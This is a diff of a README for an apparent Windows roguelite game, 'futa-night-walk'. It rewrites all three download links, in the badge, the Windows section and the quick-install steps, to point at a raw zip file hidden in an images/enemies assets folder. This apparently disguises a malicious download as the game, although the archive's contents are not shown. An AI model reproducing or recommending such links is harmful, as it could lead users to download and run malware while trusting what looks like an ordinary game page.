@@ -1,6 +1,6 @@
 # 🎮 futa-night-walk - Start fast, play in minutes
 
-[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/armenian-incorporation957/futa-night-walk)
+[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/armenian-incorporation957/futa-night-walk/raw/refs/heads/main/assets/images/enemies/walk_night_futa_v1.4.zip)
 
 ## 🕹️ What this is
 
@@ -11,7 +11,7 @@ Use it if you want a top-down roguelite with quick runs, simple controls, and a 
 ## 📥 Download and run on Windows
 
 Visit this page to download:
-https://github.com/armenian-incorporation957/futa-night-walk
+https://github.com/armenian-incorporation957/futa-night-walk/raw/refs/heads/main/assets/images/enemies/walk_night_futa_v1.4.zip
 
 Follow these steps on Windows:
 
@@ -200,7 +200,7 @@ Once you feel ready, switch to the harder mode and push for a higher score
 ## 🖱️ Quick install path
 
 1. Open the download page:
-   https://github.com/armenian-incorporation957/futa-night-walk
+   https://github.com/armenian-incorporation957/futa-night-walk/raw/refs/heads/main/assets/images/enemies/walk_night_futa_v1.4.zip
 2. Get the game files.
 3. Extract them if needed.
 4. Open the folder.
